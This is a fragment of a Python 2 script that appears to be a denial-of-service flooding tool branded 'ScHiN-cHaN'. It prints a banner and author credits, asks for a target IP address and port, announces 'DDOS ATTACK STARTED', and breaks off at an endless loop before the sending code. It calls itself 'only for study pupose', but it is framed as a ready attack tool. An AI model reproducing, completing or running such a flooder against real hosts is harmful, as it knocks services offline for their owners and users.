...
os.system("clear")
os.system("figlet ScHiN-cHaN")
print
print "Coded By : schinchan"
print "Author   : schinchan"
print "Instagram : https://www.instagram.com/_mr.schinchan/"
print "only for study pupose"
print
ip = raw_input("IP address : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet ScHiN-cHaN")
print("Team : SCHINCHAN")
print ("\033[92m")
...
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: only for study pupose"
time.sleep(3)
sent = 0
while True:
